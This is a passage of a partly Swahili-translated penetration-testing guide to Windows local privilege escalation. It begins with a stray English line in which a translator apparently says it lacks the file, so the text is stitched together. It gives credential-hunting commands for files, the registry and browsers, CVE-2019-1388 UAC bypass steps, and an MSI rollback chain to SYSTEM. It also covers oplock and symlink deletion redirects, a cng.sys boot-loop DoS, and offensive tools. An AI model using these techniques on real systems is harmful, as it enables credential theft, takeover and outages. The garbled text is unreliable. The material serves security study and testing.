I don't have the file contents. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the list of proposed files) and I will translate the relevant English text to Swahili while preserving all markdown, tags, links, and paths.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials katika RecycleBin

Pia unapaswa kuangalia Bin kutafuta credentials ndani yake

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vya registry vinavyoweza kuwa na credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia za Vichunguzi

Unapaswa kutafuta dbs ambako nywila kutoka **Chrome au Firefox** zinahifadhiwa.\
Angalia pia historia, bookmarks na favourites za vichunguzi—huenda baadhi ya **nywila** zimetunzwa hapo.

Zana za kutoa nywila kutoka kwa vichunguzi:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu **mawasiliano kati** ya vipengele vya programu vilivyotengenezwa kwa lugha tofauti. Kila COM component inatambulika kupitia class ID (CLSID) na kila component inaonyesha utendakazi kupitia moja au interfaces zaidi, zinazoelezewa kupitia interface IDs (IIDs).

COM classes na interfaces zinafafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii imeundwa kwa kuchanganya **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza **kuandika upya yoyote ya DLLs** ambazo zitatekelezwa, unaweza **escalate privileges** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi wadukuzi wanavyotumia COM Hijacking kama mbinu ya kudumu angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### Utafutaji wa nywila kwa ujumla katika mafaili na registry

**Tafuta yaliyomo ndani ya faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta rejista kwa majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Vifaa vinavyotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **kutekeleza moja kwa moja kila metasploit POST module inayotafuta credentials** ndani ya mwanaathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) huchunguza moja kwa moja mafaili yote yanayojumuisha passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni chombo kingine kizuri cha kuchukua password kutoka kwenye mfumo.

Chombo [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) huchunguza **sessions**, **usernames** na **passwords** za zana kadhaa ambazo zinaweka data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kuwa **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) wenye **full access**. Mchakato huo huo **pia huunda mchakato mpya** (`CreateProcess()`) **wenye low privileges lakini ukirithi handles zote zilizofunguliwa za mchakato mkuu**.\
Kisha, ikiwa una **full access kwa mchakato mwenye low privileges**, unaweza kunyakua **open handle ya mchakato mwenye privileges iliyoundwa** na `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hiki kingine kwa maelezo ya kina zaidi juu ya jinsi ya kujaribu na kutilia matumizi handlers zaidi za mchakato na thread zilizorithiwa zenye viwango tofauti vya ruhusa (si tu full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazojulikana kama **pipes**, zinawezesha mawasiliano ya mchakato na uhamishaji wa data.

Windows inatoa kipengele kinachoitwa **Named Pipes**, kuruhusu michakato isiyohusiana kushiriki data, hata kwenye mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu yaliyoainishwa ni **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyoweka pipe ina uwezo wa **kuchukua utambulisho** wa **client**, mradi iwe na haki za **SeImpersonate** zinazohitajika. Kutambua **mchakato wenye privileges** unaoongea kupitia pipe unaweza kuunda fursa ya **kupata privileges za juu** kwa kuchukua utambulisho wa mchakato huo mara unapoingiliana na pipe uliyoweka. Kwa maagizo ya jinsi ya kutekeleza shambulio kama hilo, mwongozo wenye msaada unaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia zana ifuatayo inaruhusu **kupiga intercept mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kutafuta privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) katika server mode inaonyesha `\\pipe\\tapsrv` (MS-TRP). Client ya mbali yenye uthibitisho inaweza kutumia njia ya matukio ya async inayotegemea mailslot kugeuza `ClientAttach` kuwa uandishi wa **4-byte** yoyote kwa faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za Telephony admin na kupakia DLL yoyote kama service. Mtiririko kamili:

- `ClientAttach` na `pszDomainUser` ikipewa path iliyopo inayoandikwa → service inaiweka wazi kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa matukio ya async.
- Kila tukio linaandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` kwa handle hiyo. Sajili line app na `LRegisterRequestRecipient` (`Req_Func 61`), chochea `TRequestMakeCall` (`Req_Func 121`), chukua kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/shutdown ili kurudia uandishi wa deterministic.
- Jiweke kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, ungana tena, kisha piga `GetUIDllName` ukiweka path ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Viungo vinavyoweza kubofuliwa vya Markdown vinavyopitishwa kwa `ShellExecuteExW` vinaweza kuanzisha handlers hatari za URI (`file:`, `ms-appinstaller:` au scheme yoyote ilyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Angalia:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama mtumiaji, kunaweza kuwa na scheduled tasks au michakato mingine inayotekelezwa ambayo **inapitisha nywila kwenye command line**. Script hapa chini inakamata command lines za mchakato kila sekunde mbili na ikalinganishe hali ya sasa na ile ya awali, ikitoa tofauti yoyote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa michakato

## Kutoka kwa Mtumiaji wa Haki Ndogo hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Iwapo una ufikiaji wa kiolesura cha grafiki (via console or RDP) na UAC imeamilishwa, katika baadhi ya toleo za Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na ruhusa.

Hii inafanya iwezekane kuinua ruhusa na kuepuka UAC kwa wakati mmoja kwa kutumia udhaifu huo huo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumika wakati wa mchakato huo imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathirika ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kuchukua faida ya udhaifu huu, ni muhimu kufuata hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Una mafaili yote muhimu na taarifa katika GitHub repository ifuatayo:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Soma hii ili ujifunze kuhusu Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha soma hii ujifunze kuhusu UAC na UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Mbinu iliyoelezewa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) na msimbo wa exploit [**unaopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio kwa msingi unalenga kutumia kipengele cha rollback cha Windows Installer kubadilisha faili halali kwa haribifu wakati wa mchakato wa uninstallation. Kwa hili mshambuliaji anahitaji kuunda MSI installer haribifu ambayo itatumika ku-hijack `C:\Config.Msi` folder, ambayo baadaye Windows Installer itaitumia kuhifadhi faili za rollback wakati wa uninstallation ya package nyingine za MSI ambapo faili za rollback zingeweza kuwa zimebadilishwa kuwa payload haribifu.

Mbinu iliyofupishwa ni ifuatayo:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit NTFS internals: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu huhifadhi **metadata ya faharasa** ya folda.

Hivyo, ukifuta **mtiririko `::$INDEX_ALLOCATION`** wa folda, NTFS **huondoa folda nzima** kutoka kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha API ya kufuta *file*, inafuta **folder mwenyewe**.

### From Folder Contents Delete to SYSTEM EoP
Je, primitive yako haikuwezeshi kukuruhusu kufuta files/folders kiholela, lakini **inakaruhusu kufuta *contents* ya attacker-controlled folder**?

1. Hatua 1: Tayarisha bait folder na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- Oplock hiyo **inasimamisha utekelezaji** wakati mchakato wenye ruhusa za juu anajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Sababisha mchakato wa SYSTEM (mfano, `SilentCleanup`)
- Mchakato huu unachunguza folda (mfano, `%TEMP%`) na kujaribu kufuta yaliyomo ndani yake.
- Itakapofika kwenye `file1.txt`, **oplock huanzisha** na kuipatia callback yako udhibiti.

4. Hatua 4: Ndani ya oplock callback – elekeza upya kufutwa

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inafanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hiyo ingetoa oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Tengeneza **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga mtiririko wa ndani wa NTFS unaohifadhi metadata ya folda — kuifuta kunasababisha kufutwa kwa folda.

5. Hatua 5: Kuachilia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda Yoyote hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **unda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) kwa jina la **dereva muhimu wa Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ikiwa **utaianzisha kabla kama folda**, Windows inashindwa kupakia driver halisi wakati wa boot.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa boot.
- Inaiona folda, **inashindwa kutatua driver halisi**, na **inabomoka au kusimamisha boot**.
- Hakuna **mbadala**, na hakuna **urejesho** bila uingiliaji wa nje (mf., ukarabati wa boot au upatikanaji wa diski).

### Kutoka kwa privileged log/backup paths + OM symlinks hadi arbitrary file overwrite / boot DoS

When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config storing the target path is writable by the attacker (e.g., `%ProgramData%\...\.ini`).
- Ability to create a mount point to `\RPC Control` and an OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- A privileged operation that writes to that path (log, export, report).

**Example chain**
1. Read the config to recover the privileged log destination, e.g. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirect the path without admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri komponenti lenye ruhusa iandike log (mfano, admin anachochea "send test SMS"). Uandishi sasa unaenda `C:\Windows\System32\cng.sys`.
4. Kagua lengo lililobadilishwa (hex/PE parser) ili kuthibitisha uharibifu; reboot inalazimisha Windows ipakishe njia ya driver iliyodanganywa → **boot loop DoS**. Hii pia inajumuisha faili yoyote iliyo na ulinzi ambayo huduma yenye ruhusa itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, na kufanya iwe DoS sink inayotegemewa kwa data iliyoharibika.



## **Kutoka High Integrity hadi SYSTEM**

### **Huduma mpya**

Ikiwa tayari unafanya kazi kwenye mchakato wa High Integrity, **njia kuelekea SYSTEM** inaweza kuwa rahisi kwa **kuunda na kuendesha huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapotengeneza service binary hakikisha ni service halali au kwamba binary inafanya vitendo vinavyohitajika haraka kwani itauawa ndani ya sekunde 20 ikiwa sio service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwasha registry entries za AlwaysInstallElevated** na **kusakinisha** reverse shell ukitumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusiana na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata msimbo hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una hizo token privileges (labda utazipata kwenye mchakato ulio tayari kuwa High Integrity), utaweza **kufungua karibu mchakato wowote** (si protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato, na kuunda **mchakato wowote ukiwa na token hiyo**.\
Matumizi ya teknik hii kwa kawaida hujumuisha **kuchagua mchakato wowote unaoendesha kama SYSTEM na token privileges zote** (_ndio, unaweza kupata mchakato za SYSTEM bila token privileges zote_).\
**Unaweza kupata** [**mfano wa msimbo unaotekeleza teknik hii hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Teknik hii inatumiwa na meterpreter kuinua hadhi katika `getsystem`. Teknik inahusisha **kuunda pipe kisha kuunda/kuudhiilia service ili kuandika kwenye pipe hiyo**. Kisha, **server** aliyeyounda pipe akiitumia ruhusa ya **`SeImpersonate`** atakuwa na uwezo wa **kuiga token** ya mteja wa pipe (service) na kupata ruhusa za SYSTEM.\
Kama unataka [**kujifunza zaidi kuhusu name pipes usome hii**](#named-pipe-client-impersonation).\
Kama unataka kuona mfano wa [**jinsi ya kutoka high integrity hadi System ukitumia name pipes soma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utaweza **kudanganya dll** inayopakiwa (loaded) na **process** inayotendeka kama **SYSTEM** utaweza kutekeleza msimbo wowote ukiwa na ruhusa hizo. Kwa hiyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi, ni **rahisi zaidi kufikiwa kutoka kwa mchakato wa high integrity** kwani utaenda kuwa na **write permissions** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na mafaili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations inayowezekana na kukusanya info (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za vikao zilizo hifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa crendentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Pangusa nywila zilizokusanywa katika domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeration ya msingi ya privesc Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta vulnerabilities za privesc zinazojulikana (IMEDEPRECATED kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Checks za local **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta vulnerabilities za privesc zinazojulikana (inahitaji kucompile kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchambua host kutafuta misconfigurations (zaidi ni tool ya kukusanya info kuliko privesc) (inahitaji kucompile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwa softwares nyingi (exe iliyotangulia kucompiled kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Angalia misconfiguration (executable precompiled kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfigurations inayowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool iliyoundwa kwa msingi wa post hii (haiitaji accesschk ili ifanye kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazoweza kufanya kazi (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma output ya **systeminfo** na kupendekeza exploits zinazoweza kufanya kazi (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji kucompile project ukiotumia toleo sahihi la .NET ([angalia hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mshambuliaji unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
